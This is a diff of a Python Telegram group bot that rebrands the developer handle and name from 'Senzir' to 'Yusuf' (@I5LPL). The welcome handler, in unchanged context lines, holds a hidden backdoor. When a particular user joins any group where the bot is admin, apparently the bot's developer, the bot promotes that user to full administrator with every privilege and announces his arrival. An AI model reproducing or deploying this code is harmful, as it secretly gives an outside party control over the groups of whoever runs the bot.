@@ -49,7 +49,7 @@ def get_file_id(msg: Message):
 
 @app.on_message(filters.command(["المطور", "《مطور السورس》", "سينزر", "صاحب السورس", "يا يوسف"], ""), group=73) 
 async def deev(client: Client, message: Message):
-     user = await client.get_chat(chat_id="programer_senzir")
+     user = await client.get_chat(chat_id="I5LPL")
      name = user.first_name
      username = user.username 
      bio = user.bio
@@ -66,7 +66,7 @@ async def deev(client: Client, message: Message):
        pass
      await message.reply_photo(
      photo=photo,
-     caption=f"**Developer Name : {name}** \n**Devloper Username : @{username}**\n**{bio}**",
+     caption=f"**Developer Name : {name}** \n**ძᥱ᥎ᥣ᥆ρᥱᖇ ᥙ᥉ᥱᖇ ꪀᥲꪔᥱ : @{username}**\n**{bio}**",
      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]]))
      try:
        os.remove(photo)
@@ -129,10 +129,10 @@ async def welcome(client: Client, message):
          chat_id = message.chat.id
          user_id = message.new_chat_members[0].id
          await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
-         await client.set_administrator_title(chat_id, user_id, ": سينزر :")
+         await client.set_administrator_title(chat_id, user_id, ": يوسف :")
       except:
         pass
-      return await message.reply_text(f"**انضم المطور سينزر  الي هنا الان [.](https://t.me/programer_senzir)⚡**\n\n**يرجي من الاعضاء احترام وجوده 🥷**")
+      return await message.reply_text(f"**انضم المطور يوسف  الي هنا الان [.](https://t.me/I5LPL)⚡**\n\n**يرجي من الاعضاء احترام وجوده 🥷**")
     dev = await get_OWNER_ID(bot_username)
     if message.new_chat_members[0].id == OWNER_ID:
       try:
